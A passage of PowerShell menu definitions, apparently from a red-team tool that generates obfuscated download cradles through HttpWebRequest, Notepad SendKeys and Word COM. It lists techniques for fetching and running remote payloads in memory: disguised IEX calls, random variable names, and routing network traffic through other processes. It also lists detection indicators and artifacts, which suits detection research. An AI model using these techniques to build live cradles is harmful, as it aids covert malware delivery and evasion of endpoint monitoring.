    $MenuLevel_Memory_PsRestMethod_Invoke        += , @($LineSpacing, '8'  , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_PsRestMethod_Invoke        += , @($LineSpacing, '9'  , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_PsRestMethod_Invoke        += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_PsRestMethod_All            =   @()
    $MenuLevel_Memory_PsRestMethod_All           += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_NetWebRequest             =   @()
    $MenuContext_Memory_NetWebRequest            += , @('Name         ','NetWebRequest')
    $MenuContext_Memory_NetWebRequest            += , @('Description  ','.NET class that opens readable stream for downloaded data')
    $MenuContext_Memory_NetWebRequest            += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_NetWebRequest            += , @('Dependencies ','N/A')
    $MenuContext_Memory_NetWebRequest            += , @('Footprint    ',@('Entirely memory-based','No New-Object cmdlet module log entry (if Stream\3 is selected)'))
    $MenuContext_Memory_NetWebRequest            += , @('Indicators   ',@('powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Memory_NetWebRequest            += , @('Artifacts    ',@('C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Memory_NetWebRequest            += , @('User-Agent   ',@('None','UA generally trivial to change'))

    $CradleType = 9
        
    $MenuLevel_Memory_NetWebRequest               =   @()
    $MenuLevel_Memory_NetWebRequest              += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_NetWebRequest              += , @($LineSpacing, 'Class    ' , '<[Net.HttpWebRequest]>')
    $MenuLevel_Memory_NetWebRequest              += , @($LineSpacing, 'Stream   ' , '<StreamReader>/<ReadByte>')
    $MenuLevel_Memory_NetWebRequest              += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_NetWebRequest              += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Memory_NetWebRequest_Rearrange     =   @()
    $MenuLevel_Memory_NetWebRequest_Rearrange    += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_NetWebRequest_Rearrange    += , @($LineSpacing, '2' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 2))

    $MenuLevel_Memory_NetWebRequest_Class         =   @()
    $MenuLevel_Memory_NetWebRequest_Class        += , @($LineSpacing, '1' , "Default   --> <[System.Net.HttpWebRequest]>"                  , @('Out-Cradle', $CradleType, 'NetHttpWebRequest', 1))
    $MenuLevel_Memory_NetWebRequest_Class        += , @($LineSpacing, '2' , "Shortened --> <[Net.HttpWebRequest]>"                         , @('Out-Cradle', $CradleType, 'NetHttpWebRequest', 2))
    
    $MenuLevel_Memory_NetWebRequest_Stream        =   @()
    $MenuLevel_Memory_NetWebRequest_Stream       += , @($LineSpacing, '1' , "PS StreamReader   --> New-Object <IO.StreamReader>"           , @('Out-Cradle', $CradleType, 'Stream2', 1))
    $MenuLevel_Memory_NetWebRequest_Stream       += , @($LineSpacing, '2' , "PS StreamReader 2 --> One-Liner <IO.StreamReader>"            , @('Out-Cradle', $CradleType, 'Stream2', 2))
    $MenuLevel_Memory_NetWebRequest_Stream       += , @($LineSpacing, '3' , "PS ReadByte       --> While(1){`$res<.ReadByte()>}"           , @('Out-Cradle', $CradleType, 'Stream2', 3))
    
    $MenuLevel_Memory_NetWebRequest_Invoke        =   @()
    $MenuLevel_Memory_NetWebRequest_Invoke       += , @($LineSpacing, '1'  , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_NetWebRequest_Invoke       += , @($LineSpacing, '2'  , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_NetWebRequest_Invoke       += , @($LineSpacing, '3'  , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_NetWebRequest_Invoke       += , @($LineSpacing, '4'  , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_NetWebRequest_Invoke       += , @($LineSpacing, '5'  , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_NetWebRequest_Invoke       += , @($LineSpacing, '6'  , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_NetWebRequest_Invoke       += , @($LineSpacing, '7'  , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_NetWebRequest_Invoke       += , @($LineSpacing, '8'  , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_NetWebRequest_Invoke       += , @($LineSpacing, '9'  , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_NetWebRequest_Invoke       += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_NetWebRequest_All           =   @()
    $MenuLevel_Memory_NetWebRequest_All          += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_PsSendKeys                =   @()
    $MenuContext_Memory_PsSendKeys               += , @('Name         ','PsSendKeys')
    $MenuContext_Memory_PsSendKeys               += , @('Description  ',@('SendKeys class to use notepad.exe to download payload','Only-4-the-lulz/finicky/unsupported','A/V can flag on cached file(s) on disk and/or clipboard transfer','For timing adjustments modify $NotepadSendKeysSleep in Out-Cradle'))
    $MenuContext_Memory_PsSendKeys               += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_PsSendKeys               += , @('Dependencies ','notepad.exe')
    $MenuContext_Memory_PsSendKeys               += , @('Footprint    ','.LNK file and cached file(s) on disk')
    $MenuContext_Memory_PsSendKeys               += , @('Indicators   ',@('notepad.exe and svchost.exe make network connections','notepad.exe loads C:\Windows\System32\winhttp.dll','notepad.exe loads C:\Windows\System32\wininet.dll','rundll32.exe command line arguments contain DavSetCookie with URI'))
    $MenuContext_Memory_PsSendKeys               += , @('Artifacts    ',@('C:\Windows\Prefetch\NOTEPAD.EXE-********.pf','\AppData\Roaming\Microsoft\Windows\Recent\*.LNK file','\AppData\*\(Temporary Internet Files|INetCache)\*.txt'))
    $MenuContext_Memory_PsSendKeys               += , @('User-Agent   ',@('Microsoft-WebDAV-MiniRedir/*','Mozilla/* (compatible; MSIE *; Windows NT *; Win64; x64; Trident/*; .NET* .NET CLR *'))
    $MenuContext_Memory_PsSendKeys               += , @('Note         ',@('If running PS2.0 then you must define -STA/-ST for clipboard usage','If cradle fails then reset Notepad coordinates by executing:',"@('iWindowPosX','iWindowPosY') | ForEach-Object {Set-ItemProperty HKCU:\Software\Microsoft\Notepad `$_ 100}"))

    $CradleType = 10
        
    $MenuLevel_Memory_PsSendKeys                  =   @()
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Cmdlet   ' , '<New-Object>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Cmdlet2  ' , '<Start-Sleep>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Cmdlet3  ' , '<Get-ItemProperty>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Cmdlet4  ' , '<Set-ItemProperty>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Method   ' , '<LoadWithPartialName>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Method2  ' , '<Exec>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Method3  ' , '<AppActivate>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Method4  ' , '<SendKeys>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Method5  ' , '<GetText>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Flag     ' , '<-C[omObject]> (flag substring)')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Property ' , '<iWindowPosDX>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Property2' , '<iWindowPosDY>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Property3' , '<iWindowPosX>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Property4' , '<iWindowPosY>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Property5' , '<StatusBar>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Class    ' , '[<Reflection.Assembly>]')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_PsSendKeys                 += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Memory_PsSendKeys_Rearrange        =   @()
    $MenuLevel_Memory_PsSendKeys_Rearrange       += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_PsSendKeys_Rearrange       += , @($LineSpacing, '2' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 2))

    $MenuLevel_Memory_PsSendKeys_Cmdlet           =   @()
    $MenuLevel_Memory_PsSendKeys_Cmdlet          += , @($LineSpacing, '1' , "PS New-Object    --> <New-Object>"                            , @('Out-Cradle', $CradleType, 'NewObject', 1))
    $MenuLevel_Memory_PsSendKeys_Cmdlet          += , @($LineSpacing, '2' , "PS Get-Command   --> <Get-Command>/<GCM>"                     , @('Out-Cradle', $CradleType, 'NewObject', 2))
    $MenuLevel_Memory_PsSendKeys_Cmdlet          += , @($LineSpacing, '3' , "PS1.0 GetCmdlets --> <`$ExecutionContext...>"                 , @('Out-Cradle', $CradleType, 'NewObject', 3))

    $MenuLevel_Memory_PsSendKeys_Cmdlet2          =   @()
    $MenuLevel_Memory_PsSendKeys_Cmdlet2         += , @($LineSpacing, '1' , "PS Start-Sleep   --> <Start-Sleep -Milliseconds 500>"         , @('Out-Cradle', $CradleType, 'SleepMilliseconds', 1))
    $MenuLevel_Memory_PsSendKeys_Cmdlet2         += , @($LineSpacing, '2' , "PS Sleep         --> <Sleep -Mi 500>"                         , @('Out-Cradle', $CradleType, 'SleepMilliseconds', 2))
    $MenuLevel_Memory_PsSendKeys_Cmdlet2         += , @($LineSpacing, '3' , "PS Get-Command   --> <Get-Command>/<GCM>"                     , @('Out-Cradle', $CradleType, 'SleepMilliseconds', 3))
    $MenuLevel_Memory_PsSendKeys_Cmdlet2         += , @($LineSpacing, '4' , "PS1.0 GetCmdlets --> <`$ExecutionContext>..."                 , @('Out-Cradle', $CradleType, 'SleepMilliseconds', 4))
    
    $MenuLevel_Memory_PsSendKeys_Cmdlet3          =   @()
    $MenuLevel_Memory_PsSendKeys_Cmdlet3         += , @($LineSpacing, '1' , "PS Get-ItemProperty --> <Get-ItemProperty>/<GP>"              , @('Out-Cradle', $CradleType, 'GetItemProperty', 1))
    $MenuLevel_Memory_PsSendKeys_Cmdlet3         += , @($LineSpacing, '2' , "PS Get-Command      --> <Get-Command>/<GCM>"                  , @('Out-Cradle', $CradleType, 'GetItemProperty', 2))
    $MenuLevel_Memory_PsSendKeys_Cmdlet3         += , @($LineSpacing, '3' , "PS1.0 GetCmdlets    --> <`$ExecutionContext...>"              , @('Out-Cradle', $CradleType, 'GetItemProperty', 3))
    
    $MenuLevel_Memory_PsSendKeys_Cmdlet4          =   @()
    $MenuLevel_Memory_PsSendKeys_Cmdlet4         += , @($LineSpacing, '1' , "PS Set-ItemProperty --> <Set-ItemProperty>/<SP>"              , @('Out-Cradle', $CradleType, 'SetItemProperty', 1))
    $MenuLevel_Memory_PsSendKeys_Cmdlet4         += , @($LineSpacing, '2' , "PS Get-Command      --> <Get-Command>/<GCM>"                  , @('Out-Cradle', $CradleType, 'SetItemProperty', 2))
    $MenuLevel_Memory_PsSendKeys_Cmdlet4         += , @($LineSpacing, '3' , "PS1.0 GetCmdlets    --> <`$ExecutionContext...>"              , @('Out-Cradle', $CradleType, 'SetItemProperty', 3))
    
    $MenuLevel_Memory_PsSendKeys_Method           =   @()
    $MenuLevel_Memory_PsSendKeys_Method          += , @($LineSpacing, '1' , "PS LoadWithPartialName --> <LoadWithPartialName>"             , @('Out-Cradle', $CradleType, 'LoadWithPartialName', 1))
    $MenuLevel_Memory_PsSendKeys_Method          += , @($LineSpacing, '2' , "PS Get-Member          --> <| Get-Member>"                    , @('Out-Cradle', $CradleType, 'LoadWithPartialName', 2))

    $MenuLevel_Memory_PsSendKeys_Method2          =   @()
    $MenuLevel_Memory_PsSendKeys_Method2         += , @($LineSpacing, '1' , "PS Exec        --> <Exec>"                                    , @('Out-Cradle', $CradleType, 'Exec', 1))
    $MenuLevel_Memory_PsSendKeys_Method2         += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Exec', 2))
    
    $MenuLevel_Memory_PsSendKeys_Method3          =   @()
    $MenuLevel_Memory_PsSendKeys_Method3         += , @($LineSpacing, '1' , "PS AppActivate --> <AppActivate>"                             , @('Out-Cradle', $CradleType, 'AppActivate', 1))
    $MenuLevel_Memory_PsSendKeys_Method3         += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'AppActivate', 2))
    
    $MenuLevel_Memory_PsSendKeys_Method4          =   @()
    $MenuLevel_Memory_PsSendKeys_Method4         += , @($LineSpacing, '1' , "PS SendKeys    --> <SendKeys>"                                , @('Out-Cradle', $CradleType, 'SendKeys', 1))
    $MenuLevel_Memory_PsSendKeys_Method4         += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'SendKeys', 2))
    
    $MenuLevel_Memory_PsSendKeys_Method5          =   @()
    $MenuLevel_Memory_PsSendKeys_Method5         += , @($LineSpacing, '1' , "PS GetText     --> <GetText>"                                 , @('Out-Cradle', $CradleType, 'GetText', 1))
    $MenuLevel_Memory_PsSendKeys_Method5         += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'GetText', 2))
    
    $MenuLevel_Memory_PsSendKeys_Flag             =   @()
    $MenuLevel_Memory_PsSendKeys_Flag            += , @($LineSpacing, '1' , "Full Flag        --> <-ComObject>"                            , @('Out-Cradle', $CradleType, 'ComObjectFlag', 1))
    $MenuLevel_Memory_PsSendKeys_Flag            += , @($LineSpacing, '2' , "Flag Substring   --> <-C[omObject]>"                          , @('Out-Cradle', $CradleType, 'ComObjectFlag', 2))
    
    $MenuLevel_Memory_PsSendKeys_Property         =   @()
    $MenuLevel_Memory_PsSendKeys_Property        += , @($LineSpacing, '1' , "iWindowPosDX   --> <iWindowPosDX>"                            , @('Out-Cradle', $CradleType, 'iWindowPosDX', 1))
    $MenuLevel_Memory_PsSendKeys_Property        += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'iWindowPosDX', 2))
    
    $MenuLevel_Memory_PsSendKeys_Property2        =   @()
    $MenuLevel_Memory_PsSendKeys_Property2       += , @($LineSpacing, '1' , "iWindowPosDY   --> <iWindowPosDY>"                            , @('Out-Cradle', $CradleType, 'iWindowPosDY', 1))
    $MenuLevel_Memory_PsSendKeys_Property2       += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'iWindowPosDY', 2))
    
    $MenuLevel_Memory_PsSendKeys_Property3        =   @()
    $MenuLevel_Memory_PsSendKeys_Property3       += , @($LineSpacing, '1' , "iWindowPosX    --> <iWindowPosX>"                             , @('Out-Cradle', $CradleType, 'iWindowPosX', 1))
    $MenuLevel_Memory_PsSendKeys_Property3       += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'iWindowPosX', 2))
    
    $MenuLevel_Memory_PsSendKeys_Property4        =   @()
    $MenuLevel_Memory_PsSendKeys_Property4       += , @($LineSpacing, '1' , "iWindowPosY    --> <iWindowPosY>"                             , @('Out-Cradle', $CradleType, 'iWindowPosY', 1))
    $MenuLevel_Memory_PsSendKeys_Property4       += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'iWindowPosY', 2))
    
    $MenuLevel_Memory_PsSendKeys_Property5        =   @()
    $MenuLevel_Memory_PsSendKeys_Property5       += , @($LineSpacing, '1' , "StatusBar      --> <StatusBar>"                               , @('Out-Cradle', $CradleType, 'StatusBar', 1))
    $MenuLevel_Memory_PsSendKeys_Property5       += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'StatusBar', 2))
    
    $MenuLevel_Memory_PsSendKeys_Class            =   @()
    $MenuLevel_Memory_PsSendKeys_Class           += , @($LineSpacing, '1' , "Default   --> <[Void][System.Reflection>..."                  , @('Out-Cradle', $CradleType, 'ReflectionAssembly', 1))
    $MenuLevel_Memory_PsSendKeys_Class           += , @($LineSpacing, '2' , "Random    --> (<[Void]/`$Null=>)<[Reflection>..."             , @('Out-Cradle', $CradleType, 'ReflectionAssembly', 2))

    $MenuLevel_Memory_PsSendKeys_Invoke           =   @()
    $MenuLevel_Memory_PsSendKeys_Invoke          += , @($LineSpacing, '1'  , "   No Invoke         --> For <testing> download sans IEX"    , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_PsSendKeys_Invoke          += , @($LineSpacing, '2'  , "   PS IEX            --> <IEX/Invoke-Expression>"            , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_PsSendKeys_Invoke          += , @($LineSpacing, '3'  , "   PS Get-Alias      --> <Get-Alias>/<GAL>"                  , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_PsSendKeys_Invoke          += , @($LineSpacing, '4'  , "   PS Get-Command    --> <Get-Command>/<GCM>"                , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_PsSendKeys_Invoke          += , @($LineSpacing, '5'  , "   PS1.0 GetCmdlet   --> <`$ExecutionContext>..."            , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_PsSendKeys_Invoke          += , @($LineSpacing, '6'  , "   PS1.0 Invoke      --> <`$ExecutionContext>..."            , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_PsSendKeys_Invoke          += , @($LineSpacing, '7'  , "   ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"     , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_PsSendKeys_Invoke          += , @($LineSpacing, '8'  , "   PS Runspace       --> <[PowerShell]::Create()> (StdOut)"  , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_PsSendKeys_Invoke          += , @($LineSpacing, '9'  , "   Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>" , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_PsSendKeys_Invoke          += , @($LineSpacing, '10' , "   Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"       , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_PsSendKeys_All              =   @()
    $MenuLevel_Memory_PsSendKeys_All             += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_PsComWord                 =   @()
    $MenuContext_Memory_PsComWord                += , @('Name         ','PsComWord')
    $MenuContext_Memory_PsComWord                += , @('Description  ','PowerShell leveraging Microsoft Word via COM Object interactions')
    $MenuContext_Memory_PsComWord                += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_PsComWord                += , @('Dependencies ','WinWord.exe')
    $MenuContext_Memory_PsComWord                += , @('Footprint    ','.URL file and cached file(s) on disk.')
    $MenuContext_Memory_PsComWord                += , @('Indicators   ',@('svchost.exe spawns winword.exe','winword.exe makes network connection instead of powershell.exe','A/V can flag on cached file(s) on disk'))
    $MenuContext_Memory_PsComWord                += , @('Artifacts    ',@('C:\Windows\Prefetch\WINWORD.EXE-********.pf','\AppData\Roaming\Microsoft\Windows\Recent\*.URL file','\AppData\*\(Temporary Internet Files|INetCache)\*.txt'))
    $MenuContext_Memory_PsComWord                += , @('User-Agent   ',@('Microsoft Office Word *','Microsoft Office Existence Discovery','Mozilla/* (compatible; MSIE *; Windows NT *; Win64; x64; Trident/*; .NET* .NET CLR *; ms-office; MSOffice *'))

    $CradleType = 11

    $MenuLevel_Memory_PsComWord                   =   @()
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Cmdlet   ' , '<New-Object>')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Cmdlet2  ' , '<Start-Sleep>')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Method   ' , '<Open>')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Flag     ' , '<-C[omObject]> (flag substring)')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Property ' , '<Visible>')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Property2' , '<Busy>')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Property3' , '<Documents>')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Property4' , '<Content>')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Property5' , '<Text>')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Class    ' , '<[Runtime.InteropServices.Marshal]>')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Boolean  ' , '<$False>')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_PsComWord                  += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')
    
    $MenuLevel_Memory_PsComWord_Rearrange         =   @()
    $MenuLevel_Memory_PsComWord_Rearrange        += , @($LineSpacing, '1' , "Default          --> <Default> syntax arrangement"            , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_PsComWord_Rearrange        += , @($LineSpacing, '2' , "Random-Variable  --> <Random> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    
    $MenuLevel_Memory_PsComWord_Cmdlet            =   @()
    $MenuLevel_Memory_PsComWord_Cmdlet           += , @($LineSpacing, '1' , "PS New-Object    --> <New-Object>"                            , @('Out-Cradle', $CradleType, 'NewObject', 1))
    $MenuLevel_Memory_PsComWord_Cmdlet           += , @($LineSpacing, '2' , "PS Get-Command   --> <Get-Command>/<GCM>"                     , @('Out-Cradle', $CradleType, 'NewObject', 2))
    $MenuLevel_Memory_PsComWord_Cmdlet           += , @($LineSpacing, '3' , "PS1.0 GetCmdlets --> <`$ExecutionContext...>"                 , @('Out-Cradle', $CradleType, 'NewObject', 3))

    $MenuLevel_Memory_PsComWord_Cmdlet2           =   @()
    $MenuLevel_Memory_PsComWord_Cmdlet2          += , @($LineSpacing, '1' , "PS Start-Sleep   --> <Start-Sleep -Seconds 1>"                , @('Out-Cradle', $CradleType, 'Sleep', 1))
    $MenuLevel_Memory_PsComWord_Cmdlet2          += , @($LineSpacing, '2' , "PS Sleep         --> <Sleep -Se 1>"                           , @('Out-Cradle', $CradleType, 'Sleep', 2))
    $MenuLevel_Memory_PsComWord_Cmdlet2          += , @($LineSpacing, '3' , "PS Get-Command   --> <Get-Command>/<GCM>"                     , @('Out-Cradle', $CradleType, 'Sleep', 3))
    $MenuLevel_Memory_PsComWord_Cmdlet2          += , @($LineSpacing, '4' , "PS1.0 GetCmdlets --> <`$ExecutionContext>..."                 , @('Out-Cradle', $CradleType, 'Sleep', 4))

    $MenuLevel_Memory_PsComWord_Method            =   @()
    $MenuLevel_Memory_PsComWord_Method           += , @($LineSpacing, '1' , "Open         --> <Open>"                                      , @('Out-Cradle', $CradleType, 'Open', 1))
    $MenuLevel_Memory_PsComWord_Method           += , @($LineSpacing, '2' , "PS PsObject  --> <.PsObject.Properties>"                      , @('Out-Cradle', $CradleType, 'Open', 2))
    
    $MenuLevel_Memory_PsComWord_Flag              =   @()
    $MenuLevel_Memory_PsComWord_Flag             += , @($LineSpacing, '1' , "Full Flag        --> <-ComObject>"                            , @('Out-Cradle', $CradleType, 'ComObjectFlag', 1))
    $MenuLevel_Memory_PsComWord_Flag             += , @($LineSpacing, '2' , "Flag Substring   --> <-C[omObject]>"                          , @('Out-Cradle', $CradleType, 'ComObjectFlag', 2))
    
    $MenuLevel_Memory_PsComWord_Property          =   @()
    $MenuLevel_Memory_PsComWord_Property         += , @($LineSpacing, '1' , "Visible        --> <Visible>"                                 , @('Out-Cradle', $CradleType, 'Visible2', 1))
    $MenuLevel_Memory_PsComWord_Property         += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Visible2', 2))
    
    $MenuLevel_Memory_PsComWord_Property2         =   @()
    $MenuLevel_Memory_PsComWord_Property2        += , @($LineSpacing, '1' , "Busy           --> <Busy>"                                    , @('Out-Cradle', $CradleType, 'Busy', 1))
    $MenuLevel_Memory_PsComWord_Property2        += , @($LineSpacing, '2' , "PS PsObject    --> <.PsObject.Properties>"                    , @('Out-Cradle', $CradleType, 'Busy', 2))
    $MenuLevel_Memory_PsComWord_Property2        += , @($LineSpacing, '3' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Busy', 3))
    
    $MenuLevel_Memory_PsComWord_Property3         =   @()
    $MenuLevel_Memory_PsComWord_Property3        += , @($LineSpacing, '1' , "Documents      --> <Documents>"                               , @('Out-Cradle', $CradleType, 'Documents', 1))
    $MenuLevel_Memory_PsComWord_Property3        += , @($LineSpacing, '2' , "PS PsObject    --> <.PsObject.Properties>"                    , @('Out-Cradle', $CradleType, 'Documents', 2))
    $MenuLevel_Memory_PsComWord_Property3        += , @($LineSpacing, '3' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Documents', 3))
    
    $MenuLevel_Memory_PsComWord_Property4         =   @()
    $MenuLevel_Memory_PsComWord_Property4        += , @($LineSpacing, '1' , "Content        --> <Content>"                                 , @('Out-Cradle', $CradleType, 'Content', 1))
    $MenuLevel_Memory_PsComWord_Property4        += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Content', 2))
    
    $MenuLevel_Memory_PsComWord_Property5         =   @()
    $MenuLevel_Memory_PsComWord_Property5        += , @($LineSpacing, '1' , "Text           --> <Text>"                                    , @('Out-Cradle', $CradleType, 'Text', 1))
    $MenuLevel_Memory_PsComWord_Property5        += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Text', 2))
     
    $MenuLevel_Memory_PsComWord_Class             =   @()
    $MenuLevel_Memory_PsComWord_Class            += , @($LineSpacing, '1' , "Default   --> <[Void][System.Runtime>..."                     , @('Out-Cradle', $CradleType, 'RuntimeInteropServicesMarshal', 1))
    $MenuLevel_Memory_PsComWord_Class            += , @($LineSpacing, '2' , "Random    --> (<[Void]/`$Null=>)<[Runtime>..."                , @('Out-Cradle', $CradleType, 'RuntimeInteropServicesMarshal', 2))
    
    $MenuLevel_Memory_PsComWord_Boolean           =   @()
    $MenuLevel_Memory_PsComWord_Boolean          += , @($LineSpacing, '1' , "Default         --> <`$False>"                                , @('Out-Cradle', $CradleType, 'BooleanFalse', 1))
    $MenuLevel_Memory_PsComWord_Boolean          += , @($LineSpacing, '2' , "Integer         --> <0>"                                      , @('Out-Cradle', $CradleType, 'BooleanFalse', 2))
    $MenuLevel_Memory_PsComWord_Boolean          += , @($LineSpacing, '3' , "PS Get-Variable --> (<GV F*se>).Value"                        , @('Out-Cradle', $CradleType, 'BooleanFalse', 3))
